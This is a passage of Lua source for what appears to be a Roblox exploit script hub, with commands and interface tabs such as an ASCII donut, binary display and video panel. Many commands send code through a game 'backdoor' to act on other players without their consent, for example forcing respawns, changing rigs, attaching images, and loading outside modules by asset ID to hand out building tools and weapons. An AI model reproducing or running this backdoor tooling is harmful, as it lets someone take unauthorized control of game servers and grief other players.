                imageLabel.BackgroundTransparency = 1
                imageLabel.Size = UDim2.new(1, 0, 1, 0)
                imageLabel.Parent = billboardGui
            end
        ]], localPlayerName, imageId)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head

                local existingBillboard = head:FindFirstChild("headbillboarduwu")
                if existingBillboard then
                    existingBillboard:Destroy()
                end

                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Name = "headbillboarduwu"
                billboardGui.Adornee = head
                billboardGui.Size = UDim2.new(3, 0, 3, 0)
                billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                billboardGui.AlwaysOnTop = true
                billboardGui.Parent = head

                local imageLabel = Instance.new("ImageLabel")
                imageLabel.Image = "rbxassetid://%s"
                imageLabel.BackgroundTransparency = 1
                imageLabel.Size = UDim2.new(1, 0, 1, 0)
                imageLabel.Parent = billboardGui
            end
        ]], randomPlayer.Name, imageId)
	elseif target == "others" then
		bckd = string.format([[
            local localPlayerName = "%s"
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName and player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head

                    local existingBillboard = head:FindFirstChild("headbillboarduwu")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end

                    local billboardGui = Instance.new("BillboardGui")
                    billboardGui.Name = "headbillboarduwu"
                    billboardGui.Adornee = head
                    billboardGui.Size = UDim2.new(3, 0, 3, 0)
                    billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                    billboardGui.AlwaysOnTop = true
                    billboardGui.Parent = head

                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Image = "rbxassetid://%s"
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Parent = billboardGui
                end
            end
        ]], localPlayerName, imageId)
	elseif target == "all" then
		bckd = string.format([[
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head

                    local existingBillboard = head:FindFirstChild("headbillboarduwu")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end

                    local billboardGui = Instance.new("BillboardGui")
                    billboardGui.Name = "headbillboarduwu"
                    billboardGui.Adornee = head
                    billboardGui.Size = UDim2.new(3, 0, 3, 0)
                    billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                    billboardGui.AlwaysOnTop = true
                    billboardGui.Parent = head

                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Image = "rbxassetid://%s"
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Parent = billboardGui
                end
            end
        ]], imageId)
	else
		bckd = string.format([[
            local targetName = "%s"
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) and player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head

                    local existingBillboard = head:FindFirstChild("headbillboarduwu")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end

                    local billboardGui = Instance.new("BillboardGui")
                    billboardGui.Name = "headbillboarduwu"
                    billboardGui.Adornee = head
                    billboardGui.Size = UDim2.new(3, 0, 3, 0)
                    billboardGui.StudsOffset = Vector3.new(0, 0, 0)
                    billboardGui.AlwaysOnTop = true
                    billboardGui.Parent = head

                    local imageLabel = Instance.new("ImageLabel")
                    imageLabel.Image = "rbxassetid://%s"
                    imageLabel.BackgroundTransparency = 1
                    imageLabel.Size = UDim2.new(1, 0, 1, 0)
                    imageLabel.Parent = billboardGui
                end
            end
        ]], target, imageId)
	end

	if bckd then
		runbackdoor(backdoor, bckd)
	end
end)

addcommand("unheadbillboard", "unheadbb", function(target)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer
	local localPlayerName = localPlayer.Name

	local function nobillboa(player)
		if player.Character and player.Character:FindFirstChild("Head") then
			local head = player.Character.Head
			local existingBillboard = head:FindFirstChild("headbillboarduwu")
			if existingBillboard then
				existingBillboard:Destroy()
			end
		end
	end

	if not backdoor then
		if not target or target == "" or target == "me" then
			nobillboa(localPlayer)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			nobillboa(randomPlayer)
		elseif target == "others" then
			for _, player in ipairs(players) do
				if player ~= localPlayer then
					nobillboa(player)
				end
			end
		elseif target == "all" then
			for _, player in ipairs(players) do
				nobillboa(player)
			end
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					nobillboa(player)
					break
				end
			end
		end
		return
	end

	local bckd

	if not target or target == "" or target == "me" then
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head
                local existingBillboard = head:FindFirstChild("headbillboarduwu")
                if existingBillboard then
                    existingBillboard:Destroy()
                end
            end
        ]], localPlayerName)
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		bckd = string.format([[
            local player = game.Players:FindFirstChild("%s")
            if player and player.Character and player.Character:FindFirstChild("Head") then
                local head = player.Character.Head
                local existingBillboard = head:FindFirstChild("headbillboarduwu")
                if existingBillboard then
                    existingBillboard:Destroy()
                end
            end
        ]], randomPlayer.Name)
	elseif target == "others" then
		bckd = string.format([[
            local localPlayerName = "%s"
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= localPlayerName and player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head
                    local existingBillboard = head:FindFirstChild("headbillboarduwu")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end
                end
            end
        ]], localPlayerName)
	elseif target == "all" then
		bckd = [[
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head
                    local existingBillboard = head:FindFirstChild("headbillboarduwu")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end
                end
            end
        ]]
	else
		bckd = string.format([[
            local targetName = "%s"
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if string.find(string.lower(player.Name), string.lower(targetName)) and player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head
                    local existingBillboard = head:FindFirstChild("headbillboarduwu")
                    if existingBillboard then
                        existingBillboard:Destroy()
                    end
                end
            end
        ]], target)
	end

	if bckd then
		runbackdoor(backdoor, bckd)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local function getbckd(target, actionScript)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game.Players.LocalPlayer

	local function plrref(playerName)
		return string.format('game:GetService("Players"):FindFirstChild("%s")', playerName)
	end

	local processedActionScript = actionScript
		:gsub("%%replace%%", "%%username%%")
		:gsub("%%otherreplace%%", "%%playerref%%")

	if not target or target == "" or target == "me" then
		return processedActionScript
			:gsub("%%username%%", string.format('"%s"', localPlayer.Name))
			:gsub("%%playerref%%", plrref(localPlayer.Name))
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		return processedActionScript
			:gsub("%%username%%", string.format('"%s"', randomPlayer.Name))
			:gsub("%%playerref%%", plrref(randomPlayer.Name))
	elseif target == "others" then
		return string.format([[
            local players = game:GetService("Players"):GetPlayers()
            local localPlayer = game.Players.LocalPlayer
            for _, player in ipairs(players) do
                if player ~= localPlayer then
                    %s
                end
            end
        ]], processedActionScript
				:gsub("%%username%%", "player.Name")
				:gsub("%%playerref%%", "player"))
	elseif target == "all" then
		return string.format([[
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                %s
            end
        ]], processedActionScript
				:gsub("%%username%%", "player.Name")
				:gsub("%%playerref%%", "player"))
	else
		return string.format([[
            local targetName = "%s":lower()
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player.Name:lower():find(targetName) then
                    %s
                end
            end
        ]], target, processedActionScript
				:gsub("%%username%%", "player.Name")
				:gsub("%%playerref%%", "player"))
	end
end

-------------------------------------------------------------------------------------------------------------------------------

addcommand("r6", "r6", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(10869521285).ConvertRig(%otherreplace%, Enum.HumanoidRigType.R6)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("r15", "r15", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(10869521285).ConvertRig(%otherreplace%, Enum.HumanoidRigType.R15)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("respawn", "re", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "%otherreplace%:LoadCharacter()"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("kazotskykick", "kk", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(6728874428).basskick(%replace%)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("eggdog", "eggdog", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(4460809464).load(%replace%)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("guns", "guns", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(4922496226).Dreamer(%replace%)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("btools", "f3x", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(12158566951)(%replace%)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("tools", "tools", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(4888483885).ok(%replace%)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("airstriketools", "ast", function(target)
	if not backdoor then 
		unablenotify("you cannot run this command without a backdoor.") return
	end

	local actionScript = "require(11670894308).Strafe(%replace%)"
	local bckd = getbckd(target, actionScript)

	runbackdoor(backdoor, bckd)
end)

-------------------------------------------------------------------------------------------------------------------------------

donuttabopen = false
donutrunning = nil

addcommand("opendonuttab", "donut", function()
	if donuttabopen then return end
	donuttabreallyminimized = false
	donuttabminimized = false
	donuttabopen = true

	repos(uwu["donut tab top bar"], 0, 276, 260 + 26)

	if donutrunning then
		donutrunning:Disconnect()
		donutrunning = nil
	end

	local A, B = 0, 0
	local lastdonutupd = 0
	local donutupdinterval = 0.1
	local framebuffer = table.create(22)
	local chars = (".,-~:;=!*#$@"):split("")

	local sin, cos, floor, clamp = math.sin, math.cos, math.floor, math.clamp
	local pi2 = math.pi * 2

	task.spawn(function()
		donutrunning = uwu["run service"].RenderStepped:Connect(function()
			if uwu["donut"].TextTransparency == 0 then
				local currenttime = os.clock()
				if currenttime - lastdonutupd >= donutupdinterval then
					lastdonutupd = currenttime

					for i = 1, 22 do
						framebuffer[i] = {}
						for j = 1, 80 do
							framebuffer[i][j] = ' '
						end
					end

					local zBuffer = table.create(1760, 0)

					for j = 0, pi2, 0.07 do
						local sinJ = sin(j)
						local cosJ = cos(j)
						local sinA = sin(A)
						local cosA = cos(A)
						local sinB = sin(B)
						local cosB = cos(B)

						for i = 0, pi2, 0.02 do
							local sinI = sin(i)
							local cosI = cos(i)

							local h = cosJ + 2
							local D = 1 / (sinI * h * sinA + sinJ * cosA + 5)
							local t = sinI * h * cosA - sinJ * sinA

							local x = floor(40 + 30 * D * (cosI * h * cosB - t * sinB))
							local y = floor(12 + 15 * D * (cosI * h * sinB + t * cosB))
							local o = x + 80 * y

							if y >= 0 and y < 22 and x >= 0 and x < 80 then
								local N = floor(8 * ((sinJ * sinA - sinI * cosJ * cosA) * cosB - 
									sinI * cosJ * sinA - sinJ * cosA - 
									cosI * cosJ * sinB))

								if D > zBuffer[o] then
									zBuffer[o] = D
									framebuffer[y+1][x+1] = chars[clamp(N, 1, 12)]
								end
							end
						end
					end

					local output = {}
					for y = 1, 22 do
						output[y] = table.concat(framebuffer[y])
					end
					uwu["donut"].Text = table.concat(output, "\n")

					A = A + 0.04
					B = B + 0.08
				end
			end
		end)
	end)

	uwu["donut tab block main frame"].Size = UDim2.new(0, 276, 0, 233)
	uwu["donut tab top bar minimize button"].Text = "-"
	uwu["donut tab block main frame"].BackgroundTransparency = 1
	uwu["donut tab main frame 1"].Visible = true
	local gui = uwu["donut tab block all"]
	uwu["donut tab top bar"].Visible = true
	uwu["donut tab top bar"].TextTransparency = 1
	uwu["donut tab top bar"].BackgroundTransparency = 1
	uwu["donut tab main frame 1"].BackgroundTransparency = 1
	uwu["donut tab top bar close button"].BackgroundTransparency = 1
	uwu["donut tab top bar minimize button"].BackgroundTransparency = 1
	uwu["donut tab top bar reposition button"].BackgroundTransparency = 1
	uwu["donut tab top bar close button"].TextTransparency = 1
	uwu["donut tab top bar minimize button"].TextTransparency = 1
	uwu["donut tab top bar reposition button"].TextTransparency = 1
	uwu["donut tab main frame 1"].BackgroundTransparency = 1
	uwu["donut"].BackgroundTransparency = 1
	uwu["donut"].TextTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 276, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 276, 0, 260),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()

	uwu["donut tab top bar"].Visible = true
	uwu["donut tab top bar"].BackgroundTransparency = 0
	uwu["donut tab main frame 1"].BackgroundTransparency = 0
	uwu["donut tab top bar close button"].BackgroundTransparency = 0
	uwu["donut tab top bar minimize button"].BackgroundTransparency = 0
	uwu["donut tab top bar reposition button"].BackgroundTransparency = 0
	uwu["donut tab top bar close button"].TextTransparency = 0
	uwu["donut tab top bar minimize button"].TextTransparency = 0
	uwu["donut tab top bar reposition button"].TextTransparency = 0
	uwu["donut tab top bar"].TextTransparency = 0
	uwu["donut tab main frame 1"].BackgroundTransparency = 0
	uwu["donut"].BackgroundTransparency = 0
	uwu["donut"].TextTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

binarytabopen = false
binaryrunning = nil

addcommand("openbinarytab", "binary", function()
	if binarytabopen then return end
	binarytabreallyminimized = false
	binarytabopen = true
	binarytabminimized = false

	repos(uwu["binary tab top bar"], 0, 246, 230 + 26)

	if binaryrunning then
		binaryrunning:Disconnect()
		binaryrunning = nil
	end

	spawn(function()
		binaryrunning = uwu["run service"].RenderStepped:Connect(function()
			if uwu["binary"].TextTransparency == 0 then
				changebinary()
			end
		end)
	end)

	uwu["binary tab block main frame"].Size = UDim2.new(0, 246, 0, 203)
	uwu["binary tab block main frame"].BackgroundTransparency = 1
	uwu["binary tab top bar minimize button"].Text = "-"
	uwu["binary tab main frame 1"].Visible = true
	local gui = uwu["binary tab block all"]
	uwu["binary tab top bar"].Visible = true
	uwu["binary tab top bar"].TextTransparency = 1
	uwu["binary tab top bar"].BackgroundTransparency = 1
	uwu["binary tab main frame 1"].BackgroundTransparency = 1
	uwu["binary tab top bar close button"].BackgroundTransparency = 1
	uwu["binary tab top bar minimize button"].BackgroundTransparency = 1
	uwu["binary tab top bar reposition button"].BackgroundTransparency = 1
	uwu["binary tab top bar close button"].TextTransparency = 1
	uwu["binary tab top bar minimize button"].TextTransparency = 1
	uwu["binary tab top bar reposition button"].TextTransparency = 1
	uwu["binary tab main frame 1"].BackgroundTransparency = 1
	uwu["binary"].BackgroundTransparency = 1
	uwu["binary"].TextTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 246, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 246, 0, 230),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()

	uwu["binary tab top bar"].Visible = true
	uwu["binary tab top bar"].BackgroundTransparency = 0
	uwu["binary tab main frame 1"].BackgroundTransparency = 0
	uwu["binary tab top bar close button"].BackgroundTransparency = 0
	uwu["binary tab top bar minimize button"].BackgroundTransparency = 0
	uwu["binary tab top bar reposition button"].BackgroundTransparency = 0
	uwu["binary tab top bar close button"].TextTransparency = 0
	uwu["binary tab top bar minimize button"].TextTransparency = 0
	uwu["binary tab top bar reposition button"].TextTransparency = 0
	uwu["binary tab top bar"].TextTransparency = 0
	uwu["binary tab main frame 1"].BackgroundTransparency = 0
	uwu["binary"].BackgroundTransparency = 0
	uwu["binary"].TextTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

hcgentabopen = false

addcommand("openheadcanongeneratortab", "hcgen", function()
	if hcgentabopen then return end
	hcgentabreallyminimized = false
	hcgentabopen = true
	hcgentabminimized = false

	repos(uwu["gaydar tab top bar"], 0, 376, 230 + 26)

	uwu["headcanon generator tab block main frame"].Size = UDim2.new(0, 446, 0, 141)
	uwu["headcanon generator tab block main frame"].BackgroundTransparency = 1
	uwu["headcanon generator tab top bar minimize button"].Text = "-"
	uwu["headcanon generator tab main frame 1"].Visible = true
	local gui = uwu["headcanon generator tab block all"]
	uwu["headcanon generator tab top bar"].Visible = true
	uwu["headcanon generator tab top bar"].TextTransparency = 1
	uwu["headcanon generator tab top bar"].BackgroundTransparency = 1
	uwu["headcanon generator tab main frame 1"].BackgroundTransparency = 1
	uwu["headcanon generator tab top bar close button"].BackgroundTransparency = 1
	uwu["headcanon generator tab top bar minimize button"].BackgroundTransparency = 1
	uwu["headcanon generator tab top bar reposition button"].BackgroundTransparency = 1
	uwu["headcanon generator tab top bar close button"].TextTransparency = 1
	uwu["headcanon generator tab top bar minimize button"].TextTransparency = 1
	uwu["headcanon generator tab top bar reposition button"].TextTransparency = 1
	uwu["headcanon generator tab main frame 1"].BackgroundTransparency = 1
	uwu["headcanon generator output"].BackgroundTransparency = 1
	uwu["headcanon generator output"].TextTransparency = 1
	uwu["headcanon generator input"].BackgroundTransparency = 1
	uwu["headcanon generator input"].TextTransparency = 1
	uwu["headcanon generator input 2"].BackgroundTransparency = 1
	uwu["headcanon generator input 2"].TextTransparency = 1
	uwu["generate headcanon"].BackgroundTransparency = 1
	uwu["generate headcanon"].TextTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 446, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 446, 0, 168),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()

	uwu["headcanon generator tab top bar"].Visible = true
	uwu["headcanon generator tab top bar"].BackgroundTransparency = 0
	uwu["headcanon generator tab main frame 1"].BackgroundTransparency = 0
	uwu["headcanon generator tab top bar close button"].BackgroundTransparency = 0
	uwu["headcanon generator tab top bar minimize button"].BackgroundTransparency = 0
	uwu["headcanon generator tab top bar reposition button"].BackgroundTransparency = 0
	uwu["headcanon generator tab top bar close button"].TextTransparency = 0
	uwu["headcanon generator tab top bar minimize button"].TextTransparency = 0
	uwu["headcanon generator tab top bar reposition button"].TextTransparency = 0
	uwu["headcanon generator tab top bar"].TextTransparency = 0
	uwu["headcanon generator tab main frame 1"].BackgroundTransparency = 0
	uwu["headcanon generator output"].BackgroundTransparency = 0
	uwu["headcanon generator output"].TextTransparency = 0
	uwu["headcanon generator input"].BackgroundTransparency = 0
	uwu["headcanon generator input"].TextTransparency = 0
	uwu["headcanon generator input 2"].BackgroundTransparency = 0
	uwu["headcanon generator input 2"].TextTransparency = 0
	uwu["generate headcanon"].BackgroundTransparency = 0
	uwu["generate headcanon"].TextTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

gaydartabopen = false

addcommand("opengaydartab", "gaydar", function()
	if gaydartabopen then return end
	gaydartabreallyminimized = false
	gaydartabopen = true
	gaydartabminimized = false

	repos(uwu["gaydar tab top bar"], 0, 376, 230 + 26)

	uwu["gaydar tab block main frame"].Size = UDim2.new(0, 376, 0, 203)
	uwu["gaydar tab block main frame"].BackgroundTransparency = 1
	uwu["gaydar tab top bar minimize button"].Text = "-"
	uwu["gaydar tab main frame 1"].Visible = true
	local gui = uwu["gaydar tab block all"]
	uwu["gaydar tab top bar"].Visible = true
	uwu["gaydar tab top bar"].TextTransparency = 1
	uwu["gaydar tab top bar"].BackgroundTransparency = 1
	uwu["gaydar tab main frame 1"].BackgroundTransparency = 1
	uwu["gaydar tab top bar close button"].BackgroundTransparency = 1
	uwu["gaydar tab top bar minimize button"].BackgroundTransparency = 1
	uwu["gaydar tab top bar reposition button"].BackgroundTransparency = 1
	uwu["gaydar tab top bar close button"].TextTransparency = 1
	uwu["gaydar tab top bar minimize button"].TextTransparency = 1
	uwu["gaydar tab top bar reposition button"].TextTransparency = 1
	uwu["gaydar tab main frame 1"].BackgroundTransparency = 1
	uwu["gaydar scan"].TextTransparency = 1
	uwu["gaydar scan"].BackgroundTransparency = 1
	uwu["gaydar target"].TextTransparency = 1
	uwu["gaydar target"].BackgroundTransparency = 1
	uwu["gaydar info"].TextTransparency = 1
	uwu["gaydar info"].BackgroundTransparency = 1
	uwu["gaydar"].BackgroundTransparency = 1
	uwu["gaydar"].ImageTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 376, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 376, 0, 230),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()

	uwu["gaydar tab top bar"].Visible = true
	uwu["gaydar tab top bar"].BackgroundTransparency = 0
	uwu["gaydar tab main frame 1"].BackgroundTransparency = 0
	uwu["gaydar tab top bar close button"].BackgroundTransparency = 0
	uwu["gaydar tab top bar minimize button"].BackgroundTransparency = 0
	uwu["gaydar tab top bar reposition button"].BackgroundTransparency = 0
	uwu["gaydar tab top bar close button"].TextTransparency = 0
	uwu["gaydar tab top bar minimize button"].TextTransparency = 0
	uwu["gaydar tab top bar reposition button"].TextTransparency = 0
	uwu["gaydar tab top bar"].TextTransparency = 0
	uwu["gaydar tab main frame 1"].BackgroundTransparency = 0
	uwu["gaydar scan"].TextTransparency = 0
	uwu["gaydar scan"].BackgroundTransparency = 0
	uwu["gaydar target"].TextTransparency = 0
	uwu["gaydar target"].BackgroundTransparency = 0
	uwu["gaydar info"].TextTransparency = 0
	uwu["gaydar info"].BackgroundTransparency = 0
	uwu["gaydar"].BackgroundTransparency = 0
	uwu["gaydar"].ImageTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

videotabopen = false

addcommand("openvideotab", "video", function()
	if videotabopen then return end
	videotabreallyminimized = false
	videotabopen = true
	videotabminimized = false

	repos(uwu["video tab top bar"], 0, 208, 315 + 26)

	uwu["video tab block main frame"].Size = UDim2.new(0, 208, 0, 288)
	uwu["video tab block main frame"].BackgroundTransparency = 1
	uwu["video tab top bar minimize button"].Text = "-"
	uwu["video tab main frame 1"].Visible = true
	local gui = uwu["video tab block all"]
	uwu["video tab top bar"].Visible = true
	uwu["video tab top bar"].TextTransparency = 1
	uwu["video tab top bar"].BackgroundTransparency = 1
	uwu["video tab main frame 1"].BackgroundTransparency = 1
	uwu["video tab top bar close button"].BackgroundTransparency = 1
	uwu["video tab top bar minimize button"].BackgroundTransparency = 1
	uwu["video tab top bar reposition button"].BackgroundTransparency = 1
	uwu["video tab top bar close button"].TextTransparency = 1
	uwu["video tab top bar minimize button"].TextTransparency = 1
	uwu["video tab top bar reposition button"].TextTransparency = 1
	uwu["video tab top bar"].TextTransparency = 1
	uwu["video tab main frame 1"].BackgroundTransparency = 1
	uwu["video id textbox"].TextTransparency = 1
	uwu["video id textbox"].BackgroundTransparency = 1
	uwu["video id enter"].TextTransparency = 1
	uwu["video id enter"].BackgroundTransparency = 1
	uwu["video"].BackgroundTransparency = 1
	-- uwu["video"].VideoFrame.ImageTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 208, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 208, 0, 315),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()

	uwu["video tab top bar"].Visible = true
	uwu["video tab top bar"].BackgroundTransparency = 0
	uwu["video tab main frame 1"].BackgroundTransparency = 0
	uwu["video tab top bar close button"].BackgroundTransparency = 0
	uwu["video tab top bar minimize button"].BackgroundTransparency = 0
	uwu["video tab top bar reposition button"].BackgroundTransparency = 0
	uwu["video tab top bar close button"].TextTransparency = 0
	uwu["video tab top bar minimize button"].TextTransparency = 0
	uwu["video tab top bar reposition button"].TextTransparency = 0
	uwu["video tab top bar"].TextTransparency = 0
	uwu["video tab main frame 1"].BackgroundTransparency = 0
	uwu["video id textbox"].TextTransparency = 0
	uwu["video id textbox"].BackgroundTransparency = 0
	uwu["video id enter"].TextTransparency = 0
	uwu["video id enter"].BackgroundTransparency = 0
	uwu["video"].BackgroundTransparency = 0
	-- uwu["video"].VideoFrame.ImageTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

msgrevtabopen = false

addcommand("openmessagereversertab", "msgreverser", function()
	if msgrevtabopen then return end
	msgrevtabreallyminimized = false
	msgrevtabopen = true
	msgrevtabminimized = false

	repos(uwu["message reverser tab top bar"], 0, 345, 168 + 26)

	uwu["message reverser tab block main frame"].Size = UDim2.new(0, 345, 0, 141)
	uwu["message reverser tab block main frame"].BackgroundTransparency = 1
	uwu["message reverser tab top bar minimize button"].Text = "-"
	uwu["message reverser tab main frame 1"].Visible = true
	local gui = uwu["message reverser tab block all"]
	uwu["message reverser tab top bar"].Visible = true
	uwu["message reverser tab top bar"].TextTransparency = 1
	uwu["message reverser tab top bar"].BackgroundTransparency = 1
	uwu["message reverser tab main frame 1"].BackgroundTransparency = 1
	uwu["message reverser tab top bar close button"].BackgroundTransparency = 1
	uwu["message reverser tab top bar minimize button"].BackgroundTransparency = 1
	uwu["message reverser tab top bar reposition button"].BackgroundTransparency = 1
	uwu["message reverser tab top bar close button"].TextTransparency = 1
	uwu["message reverser tab top bar minimize button"].TextTransparency = 1
	uwu["message reverser tab top bar reposition button"].TextTransparency = 1
	uwu["message reverser tab main frame 1"].BackgroundTransparency = 1
	uwu["message reverser input"].BackgroundTransparency = 1
	uwu["message reverser input"].TextTransparency = 1
	uwu["reverse message"].BackgroundTransparency = 1
	uwu["reverse message"].TextTransparency = 1
	uwu["clear message reverser input"].BackgroundTransparency = 1
	uwu["clear message reverser input"].TextTransparency = 1

	gui.BackgroundTransparency = 0
	gui.Size = UDim2.new(0, 345, 0, 0)
	gui.Position = UDim2.new(0, 0, 0, 0)
	gui.Visible = true

	local tweenIn = tweenSizePosition(
		gui,
		UDim2.new(0, 345, 0, 168),
		UDim2.new(0, 0, 0, 0),
		0.5
	)
	tweenIn.Completed:Wait()

	uwu["message reverser tab top bar"].Visible = true
	uwu["message reverser tab top bar"].BackgroundTransparency = 0
	uwu["message reverser tab main frame 1"].BackgroundTransparency = 0
	uwu["message reverser tab top bar close button"].BackgroundTransparency = 0
	uwu["message reverser tab top bar minimize button"].BackgroundTransparency = 0
	uwu["message reverser tab top bar reposition button"].BackgroundTransparency = 0
	uwu["message reverser tab top bar close button"].TextTransparency = 0
	uwu["message reverser tab top bar minimize button"].TextTransparency = 0
	uwu["message reverser tab top bar reposition button"].TextTransparency = 0
	uwu["message reverser tab top bar"].TextTransparency = 0
	uwu["message reverser tab main frame 1"].BackgroundTransparency = 0
	uwu["message reverser input"].BackgroundTransparency = 0
	uwu["message reverser input"].TextTransparency = 0
	uwu["reverse message"].BackgroundTransparency = 0
	uwu["reverse message"].TextTransparency = 0
	uwu["clear message reverser input"].BackgroundTransparency = 0
	uwu["clear message reverser input"].TextTransparency = 0

	local fadeTween = fade(gui, 1, 0.2)
	fadeTween.Completed:Wait()

	gui.Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

k12tabopen = false

addcommand("openk12encoderanddecodertab", "k12", function()
	if k12tabopen then return end
	k12tabreallyminimized = false
	k12tabopen = true
	k12tabminimized = false

	repos(uwu["k12 encoder and decoder tab top bar"], 0, 545, 268 + 26)

	uwu["k12 encoder and decoder tab block main frame"].Size = UDim2.new(0, 545, 0, 241)
	uwu["k12 encoder and decoder tab block main frame"].BackgroundTransparency = 1
	uwu["k12 encoder and decoder tab top bar minimize button"].Text = "-"
